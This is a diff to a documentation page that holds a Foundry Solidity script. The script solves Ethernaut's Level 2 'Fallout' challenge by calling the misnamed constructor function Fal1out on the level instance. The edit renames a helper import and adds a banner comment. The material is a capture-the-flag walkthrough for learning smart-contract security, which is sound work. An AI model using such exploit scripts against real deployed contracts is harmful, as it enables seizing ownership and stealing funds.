@@ -96,13 +96,16 @@ make holesky-exploit-level-2
 pragma solidity ^0.8.18;
 
 import {Script, console} from "forge-std/Script.sol";
-import {GetInstanceAddress} from "script/HelperFunctions.s.sol";
+import {HelperFunctions} from "script/HelperFunctions.s.sol";
 
 interface IFallout {
     function Fal1out() external payable;
 }
 
-contract Exploit is Script, GetInstanceAddress {
+// ================================================================
+// │                      LEVEL 2 - FALLOUT                       │
+// ================================================================
+contract Exploit is Script, HelperFunctions {
     function run() public {
         address targetContractAddress = getInstanceAddress();
         IFallout targetContract = IFallout(targetContractAddress);
@@ -126,7 +129,6 @@ contract Exploit is Script, GetInstanceAddress {
 //         vm.stopBroadcast();
 //     }
 // }
-
 ```
 {% endcode %}
 
